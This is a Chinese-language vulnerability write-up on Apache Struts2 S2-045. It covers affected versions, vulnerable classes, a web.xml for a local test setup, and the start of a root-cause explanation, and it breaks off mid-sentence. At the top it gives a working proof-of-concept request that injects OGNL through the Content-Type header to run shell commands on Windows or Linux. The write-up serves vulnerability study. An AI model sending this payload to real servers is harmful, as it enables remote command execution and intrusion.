# s2-045



POC:
```java

GET /index.action HTTP/1.1
Host: localhost:8080
Content-Type:%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
Connection: close

```

## [漏洞回顾] 补充S2-045漏洞细节

---

### 0x01、为什么网上的s2-045漏洞分析文章和本地代码对不上？

原因是由于版本不对：

    2.3.5 ~ 2.3.31 版本，漏洞出现位置：
    org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest类中的buildErrorMessage方法里，97行调用了LocalizedTextUtil.findText
    2.5 ~ 2.5.10 版本，漏洞出现位置：
    org.apache.struts2.interceptor.FileUploadInterceptor类中的intercept方法里，98行调用了LocalizedTextUtil.findText

### 0x02、Struts2框架2.3.x和2.5.x本地搭建需要注意什么？

web.xml 中过滤器有区别：

```xml
<!-- 配置Struts 2.3.x的核心Filter的实现类 -->
<filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>
<!-- 配置Struts 2.5.14的核心Filter的实现类 -->
<filter-class>org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter</filter-class>
```

附上完整web.xml配置：
 ```xml
<?xml version="1.0" encoding="UTF-8"?>
  
 <web-app id="starter" version="2.4" 
          xmlns="http://java.sun.com/xml/ns/j2ee" 
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
          xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd">
  
  <display-name>Struts 2 - Maven Archetype - Starter</display-name>
  
     <filter>
         <!--过滤器名 -->
         <filter-name>struts2</filter-name>
         <!-- 配置Struts 2.3.x的核心Filter的实现类 -->
         <!--<filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>-->
         <!-- 配置Struts 2.5.x的核心Filter的实现类 -->
         <filter-class>org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter</filter-class>
     </filter>
     <!-- 让Struts 2的核心Filter拦截所有请求 -->
     <filter-mapping>
         <!--过滤器名 -->
         <filter-name>struts2</filter-name>
         <!-- 匹配所有请求 -->
         <url-pattern>/*</url-pattern>
     </filter-mapping>
  
     <!-- Welcome file lists -->
     <welcome-file-list>
         <welcome-file>index.jsp</welcome-file>
         <welcome-file>default.jsp</welcome-file>
         <welcome-file>index.html</welcome-file>
     </welcome-file-list>
  
 </web-app>
```

### 0x03、为什么异常信息会被当做Ognl执行？


看过网上分析文章，大家知道原理是由于引入非法Content-type（FileUploadBase类518行会校验Content-Type），报错信息中包含Ognl表达式，所以被执行。 那么为什么报错信息会被执行？
经过分析，是由于struts2考虑到国际化...emmm